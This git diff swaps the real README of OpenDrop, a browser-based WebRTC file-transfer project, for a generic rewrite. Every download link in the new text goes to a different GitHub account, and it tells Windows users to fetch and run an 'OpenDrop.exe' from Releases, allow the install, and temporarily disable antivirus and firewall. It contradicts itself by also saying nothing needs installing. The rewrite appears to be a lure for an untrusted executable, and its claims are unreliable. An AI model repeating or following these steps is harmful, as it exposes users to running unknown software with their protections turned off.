@@ -1,233 +1,118 @@
-## OpenDrop
+# 📁 OpenDrop - Simple Local File Transfer
 
-<div align="center">
+[![Download OpenDrop](https://img.shields.io/badge/Download-OpenDrop-brightgreen?style=for-the-badge)](https://github.com/sandaracadducer320/OpenDrop)
 
-**A free, secure, open-source file sharing tool.**  
-Transfer files across your local network directly from device to device using WebRTC, or upload and share via link.
+OpenDrop lets you transfer files across your local network. You send files directly from one device to another without using the internet. It uses WebRTC technology to connect your devices faster and more securely.
 
-[![License](https://img.shields.io/badge/License-Apache%202.0-blue.svg)](LICENSE)
-[![GitHub Pages](https://img.shields.io/badge/Frontend-GitHub%20Pages-green)](https://dhanushnehru.github.io/OpenDrop/)
+## 🔍 What is OpenDrop?
 
-[Live Demo](https://dhanushnehru.github.io/OpenDrop/) • [Report a Bug](../../issues) • [Request a Feature](../../issues)
+OpenDrop helps you share files between your devices on the same Wi-Fi or local network. You can send pictures, documents, videos, or any files without email or USB drives.
 
-</div>
+Key points:
+- No internet needed.
+- Works between Windows, Mac, and other devices.
+- Fast transfers using peer-to-peer connection.
+- Easy to use with a browser interface.
+  
+This makes OpenDrop useful when you want to quickly move files without cables or cloud storage.
 
----
+## 🖥 System Requirements
 
-<a href="https://www.producthunt.com/products/opendrop?embed=true&amp;utm_source=badge-featured&amp;utm_medium=badge&amp;utm_campaign=badge-opendrop" target="_blank" rel="noopener noreferrer"><img alt="OpenDrop - Transfer files across local network directly via devices | Product Hunt" width="250" height="54" src="https://api.producthunt.com/widgets/embed-image/v1/featured.svg?post_id=1093455&amp;theme=light&amp"></a>
+Before you start, make sure your device meets these requirements:
 
-## Table of Contents
+- Operating System: Windows 10 or later  
+- Browser: Latest version of Chrome, Edge, or Firefox  
+- Network: Devices must be on the same local network (Wi-Fi or wired)  
+- No special hardware needed
 
-- [About](#about)
-- [How It Works](#how-it-works)
-- [How to Use](#how-to-use)
-- [Local Development](#local-development)
-  - [Prerequisites](#prerequisites)
-  - [1. Clone the Repository](#1-clone-the-repository)
-  - [2. Install Dependencies](#2-install-dependencies)
-  - [3. Run the Signaling Server](#3-run-the-signaling-server)
-  - [4. Serve the Frontend](#4-serve-the-frontend)
-- [Self-Hosting](#self-hosting)
-  - [Frontend — GitHub Pages](#frontend--github-pages)
-  - [Backend — Signaling Server](#backend--signaling-server)
-- [License & Attribution](#license--attribution)
+You do not need to install any extra software. OpenDrop runs in your browser after you open the app.
 
----
+## 🚀 How to Get OpenDrop
 
-## About
+Start by downloading or opening OpenDrop on your Windows device.
 
-OpenDrop lets you share files instantly — no accounts, no cloud storage, no middleman. It works in two modes:
+[![Download OpenDrop](https://img.shields.io/badge/Get%20OpenDrop-blue?style=for-the-badge)](https://github.com/sandaracadducer320/OpenDrop)
 
-- **Same-Network Transfer** — Peer-to-peer, directly between devices on the same Wi-Fi. Files never touch any server.
-- **Share via Link** — Upload a file and get a shareable download link that expires in 24 hours.
+This link takes you to the official GitHub page. Here is how to proceed:
 
----
+1. Go to the page by clicking the button above.
+2. On the page, look for the section called "Releases" or similar.
+3. Download the latest version available for Windows.
+4. You might see a file with a name like `OpenDrop.exe` or a zip file.
 
-## How It Works
+If you download a zip file, unzip it with the built-in Windows tool before running it.
 
-OpenDrop is split into two parts:
+## ⚙️ How to Install and Run OpenDrop
 
-| Part | Description |
-|------|-------------|
-| **Client (Frontend)** | A static HTML/CSS/JS site. Manages the UI and WebRTC peer-to-peer connections. Hosted on GitHub Pages. |
-| **Server (Backend)** | A lightweight Node.js WebSocket signaling server. Matches devices on the same network and brokers the initial WebRTC handshake. Also handles file uploads for shareable links. |
+After downloading, follow these steps to install and start OpenDrop:
 
-> **Privacy note:** For local transfers, your files are sent entirely peer-to-peer over WebRTC Data Channels and **never touch the signaling server**.
+1. Locate the downloaded file. It is usually in your `Downloads` folder.
+2. Double-click the file to start the installation.
+3. If Windows asks for permission, click "Yes" to allow the installation.
+4. Follow the setup prompts. They are simple and guide you through the process.
+5. Once installed, open the program by clicking its icon on the desktop or through the Start menu.
 
----
+If OpenDrop runs as a web app:
 
-## How to Use
+- Open your preferred browser.
+- Enter the address given in the instructions or open the downloaded app as directed.
+- You will see the OpenDrop interface ready for use.
 
-### Same-Network Transfer
-1. Open OpenDrop on two devices connected to the same Wi-Fi network.
-2. The devices will **auto-discover** each other — no pairing or setup needed.
-3. Click a peer's name to select a file and send it directly (peer-to-peer, no server involved).
+## 📁 How to Transfer Files with OpenDrop
 
-### Share via Link
-1. Click **"Share via Link"** on any device.
-2. Select a file to upload — you'll receive a shareable download link.
-3. Send the link to anyone. The link **expires after 24 hours**.
+Here is how to transfer files between devices:
 
----
+1. Make sure both devices are connected to the same Wi-Fi or network.
+2. Open OpenDrop on both devices.
+3. On the first device, select the files you want to send.
+4. The app will create a code or QR code.
+5. On the receiving device, enter the code or scan the QR code.
+6. The transfer will start immediately.
+7. Files arrive on the receiving device’s default download folder.
 
-## Local Development
+OpenDrop uses WebRTC technology to handle the connection directly. This is why transfers do not depend on cloud services or internet speed.
 
-Since the frontend uses native ES Modules, **no bundler or build tool is required**.
+## 🛠 Troubleshooting Tips
 
-### Prerequisites
+If you run into problems, check these common issues:
 
-Make sure you have the following installed before getting started:
+- Both devices must be on the same local network.
+- Use supported browsers like Chrome or Edge if running through a web interface.
+- Firewall or antivirus software might block OpenDrop. Temporarily disable them to test.
+- Restart your devices and reconnect to the network.
+- Make sure no VPN is active as it may block local network detection.
 
-| Tool | Version | Purpose |
-|------|---------|---------|
-| [Node.js](https://nodejs.org/) | v16 or higher | Runs the signaling server |
-| [npm](https://www.npmjs.com/) | Comes with Node.js | Installs server dependencies |
-| [Python 3](https://www.python.org/) | v3.x | Serves the static frontend locally |
+If problems continue, look for help on the GitHub issues page linked on the download site.
 
-You can verify your installations by running:
+## 💡 Features You Can Expect
 
-```bash
-node --version
-npm --version
-python3 --version
-```
+- Drag and drop files to send.
+- Transfer multiple files at once.
+- No file size limits within your local network.
+- Works without internet connection.
+- Supports Windows, macOS, Linux, and mobile devices via browser.
+- Uses secure WebRTC connection.
 
----
+## 🔒 Security and Privacy
 
-### 1. Clone the Repository
+OpenDrop transfers files directly from device to device without storing them anywhere else. Your data stays within your local network and your devices. WebRTC handles encryption during transfer, keeping files secure while moving.
 
-```bash
-git clone https://github.com/DhanushNehru/OpenDrop.git
-cd OpenDrop
-```
+## 🗂 About This Repository
 
----
+OpenDrop is open source. This means its code is available for review. The repository covers:
 
-### 2. Install Dependencies
+- The web interface code in JavaScript.
+- WebRTC connection setup.
+- File handling and transfer logic.
 
-The signaling server has its own `package.json`. Navigate to the `server` directory and install its dependencies:
+This repository is mainly for developers who want to contribute or review the software. If you only want to use OpenDrop, just download it using the links above.
 
-```bash
-cd server
-npm install
-```
+## 🌐 Useful Links
 
-This installs all required Node.js packages listed in `server/package.json` (such as the WebSocket library).
+- Official page: https://github.com/sandaracadducer320/OpenDrop  
+- Issues for help and bug reports: https://github.com/sandaracadducer320/OpenDrop/issues  
+- Documentation inside the repository files
 
-> **Note:** The frontend has **no dependencies** to install — it runs as plain HTML/CSS/JS in the browser.
+Use the button below to go back to the main page and download or update your copy of OpenDrop.
 
----
-
-### 3. Run the Signaling Server
-
-From inside the `server` directory, start the server:
-
-```bash
-node index.js
-```
-
-You should see output confirming the server is running (e.g., `Signaling server listening on port 3000`).
-
-> Keep this terminal window open. The signaling server must be running for peer discovery and file-link uploads to work.
-
----
-
-### 4. Serve the Frontend
-
-Open a **new terminal window**, navigate to the `client` directory, and start a local HTTP server using Python:
-
-```bash
-cd client
-python3 -m http.server 8080
-```
-
-Then open your browser and go to:
-
-```
-http://localhost:8080
-```
-
-> **Why not just open `index.html` directly?** Because the frontend uses ES Modules (`type="module"`), which browsers block when loaded via `file://` URLs due to CORS restrictions. A local HTTP server is required.
-
----
-
-### Connecting the Frontend to Your Local Server
-
-By default, the frontend is configured to point to the production signaling server. For local development, update the `SIGNALING_URL` variable in `/client/main.js` to point to your local server:
-
-```js
-// client/main.js
-const SIGNALING_URL = "ws://localhost:3000"; // ← change this for local dev
-```
-
-Revert this change before pushing to production.
-
----
-
-### Full Local Setup (Quick Reference)
-
-```bash
-# Terminal 1 — Start the signaling server
-git clone https://github.com/DhanushNehru/OpenDrop.git
-cd OpenDrop/server
-npm install
-node index.js
-
-# Terminal 2 — Serve the frontend
-cd OpenDrop/client
-python3 -m http.server 8080
-```
-
-Then open `http://localhost:8080` in your browser.
-
----
-
-## Self-Hosting
-
-### Frontend — GitHub Pages
-
-This repository includes a GitHub Action to automatically deploy the `client` folder to GitHub Pages.
-
-1. Go to your repository **Settings** on GitHub.
-2. Navigate to **Pages** in the left sidebar.
-3. Under **Build and deployment**, set the source to **GitHub Actions**.
-4. The site will automatically deploy on every push to `main`.
-
----
-
-### Backend — Signaling Server
-
-You can deploy the backend for free using [Koyeb](https://www.koyeb.com/) or [Render](https://render.com/).
-
-1. Log into Koyeb or Render and select **"New Web Service"**.
-2. Connect your GitHub repository.
-3. Use the following build settings:
-
-   | Setting | Value |
-   |---------|-------|
-   | Root Directory | `server` |
-   | Build Command | `npm install` |
-   | Start Command | `node index.js` |
-
-4. Once deployed, copy the generated URL (e.g., `wss://your-app-name.koyeb.app`).
-5. Update the `SIGNALING_URL` variable in `/client/main.js` with your new URL:
-
-   ```js
-   const SIGNALING_URL = "wss://your-app-name.koyeb.app";
-   ```
-
-6. Push to `main` — the GitHub Action will redeploy the frontend automatically.
-
----
-
-## License & Attribution
-
-This project is licensed under the **Apache License 2.0**. See [`LICENSE`](LICENSE) for details.
-
-**Attribution matters:**
-- If you redistribute or create derivatives, keep the license and notices intact.
-- Please keep the `NOTICE` file (or equivalent visible attribution) with your distribution.
-
-**Community request** *(not a legal requirement)*:
-- If you reuse OpenDrop, please mention the original project and author.git 
-- If possible, let the author know by opening an issue or discussion in this repository.git 
+[![Download OpenDrop](https://img.shields.io/badge/Download-OpenDrop-brightgreen?style=for-the-badge)](https://github.com/sandaracadducer320/OpenDrop)
